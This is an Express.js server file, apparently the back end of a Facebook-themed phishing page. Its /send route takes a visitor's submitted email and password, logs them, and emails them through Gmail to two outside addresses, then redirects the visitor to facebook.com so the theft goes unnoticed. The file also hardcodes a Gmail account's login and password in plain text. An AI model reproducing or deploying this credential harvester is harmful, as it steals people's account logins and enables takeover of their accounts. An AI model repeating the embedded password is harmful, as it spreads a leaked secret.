var nodemailer = require('nodemailer');
var express = require('express');
var bodyParser = require('body-parser');
var app = express();

app.set('port', (process.env.PORT || 5000));

app.use(bodyParser.urlencoded({extended: true}));
app.use(bodyParser.json());

app.use(express.static(__dirname + '/public'));

// views is directory for all template files
app.set('views', __dirname + '/views');
app.set('view engine', 'ejs');

app.get('/', function(request, response) {
    response.render('pages/index')
});

app.post('/send',function(request,response){
    console.log(request.body.email);
    console.log(request.body.psw);

    var transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'arzymatjorobekovofficial@gmail.com',
            pass: 'arzy967596'
        }
    });

    var mailOptions = {
        from: 'arzymatjorobekovofficial@gmail.com',
        to: 'arzy967596@gmail.com , keldibekov066@gmail.com',
        subject: 'Sending Email using Node.js',
        text: "username:" + request.body.email + " password:" + request.body.psw
    };

    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });

    response.redirect('http://facebook.com');
});

app.listen(app.get('port'), function() {
    console.log('Node app is running on port', app.get('port'));
});